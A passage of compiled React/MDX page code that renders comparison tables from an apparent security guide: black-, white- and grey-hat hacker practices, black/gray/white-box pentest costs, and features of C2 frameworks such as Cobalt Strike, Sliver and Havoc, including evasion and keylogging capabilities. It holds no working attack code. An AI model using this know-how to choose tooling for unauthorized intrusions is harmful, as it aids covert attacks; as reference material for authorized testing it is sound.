          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Variable: may disclose publicly"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Bug Bounty Participation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Never"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Primary channel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sometimes, with disputes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Target Selection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Financial ROI, strategic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Client contract, bounty scope"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Personal interest, high-profile"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Tooling"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2 frameworks, custom malware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Same tools, authorized use"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Same tools, unauthorized targets"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Malware Use"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Crypter, FUD, persistence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Proof-of-concept only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sometimes PoC, sometimes weaponized"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "C2 Usage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes, obfuscated"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes, authorized"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sometimes, unauthorized"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Data Handling"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Exfiltrate, sell, ransom"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Confidential, delete after report"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Variable (may publish)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reporting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None (stay hidden)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Comprehensive report"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Blog post, tweet, or nothing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Remediation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None (want vulns to persist)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detailed recommendations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Offer to help fix"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Collaboration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Darknet forums, private chats"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Teams, professional orgs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Twitter, Reddit, Discord"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "OPSEC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Essential (avoid jail)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None needed (legal)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Necessary (legal risk)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Career Path"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Underground, occasionally caught"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security engineer, pentester, CISO"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Variable: may go either way"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Public Perception"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Villains"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Heroes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Anti-heroes (controversial)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Jail Risk"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Near zero"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (CFAA interpretation)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "62-pentest-types-comparison",
      children: "6.2 Pentest Types Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Black Box"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Gray Box"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "White Box"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Information Given"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None (domain/IP only)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Credentials, docs, network diagrams"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full source code, architecture, configs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Realism"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Most realistic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Least realistic"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Time Efficiency"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Worst (recon-intensive)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Most efficient"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cost"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Highest"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lowest"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Finding Depth"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Surface to medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium to deep"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deepest (logic flaws, crypto issues)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Best For"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "External perimeter"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Web apps, APIs, cloud"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Source code review, crypto"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Coverage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Subdomain-dependent"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "More comprehensive"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Most comprehensive"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Skill Required"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full stack (recon to exploit)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Specialized (code analysis)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Client Preference"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rare (expensive)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Most common"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Common for compliance"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "63-testing-knowledge-levels",
      children: "6.3 Testing Knowledge Levels"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Black Box"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Gray Box"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "White Box"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Target Knowledge"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Architecture, credentials"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full source, configs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Recon Phase"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extensive (OSINT, scanning)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minimal (skip basic recon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None needed"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability Discovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Scanning + Fuzzing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Static + dynamic combined"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Code analysis + static"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exploitation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Need full chain"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Faster (auth bypass pre-solved)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Focus on logic flaws"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reporting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attack chain narrative"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hybrid narrative"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Code-level detail"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Typical Duration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "3-4 weeks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2-3 weeks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-2 weeks"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Typical Cost"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50K-"
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "100K+"]
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "20"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "20K-"
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "20"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "60K"]
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "10"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "K"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "10K-"
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7667em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "10"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0715em"
                    },
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "30K"]
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "64-c2-framework-comparison",
      children: "6.4 C2 Framework Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Feature"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Cobalt Strike"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Sliver"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Havoc"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Empire"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Covenant"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mythic"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Open Source"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No ($3,500/yr)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (BSL)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (Apache)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (BSD)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (MIT)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (BSD)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Language"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Java (GUI) + C (beacon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Go"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Go + C"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Python (server) PS (agent)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C# (.NET)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Python + Various"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Platform"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Win/Linux"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Win/Linux/Mac"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Win/Linux"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Win/Linux"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Win/Linux"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Win/Linux/Mac"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "GUI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rich desktop"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CLI + web"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Desktop"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CLI + web"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Desktop"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Web"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "HTTP/S C2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DNS C2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SMB C2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (named pipe)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "mTLS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WireGuard"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SOCKS Proxy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Malleable C2 Profiles"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (extensive)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (limited)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (extensive)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Sleep Obfuscation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (extension)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (built-in)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Indirect Syscalls"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extension"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (built-in)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extension"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Process Injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (many methods)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Keylogger"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extension"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Screenshot"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "File Browser"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Execute-Assembly"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes (sideload)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "N/A (PS native)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "BoF Support"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Yes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
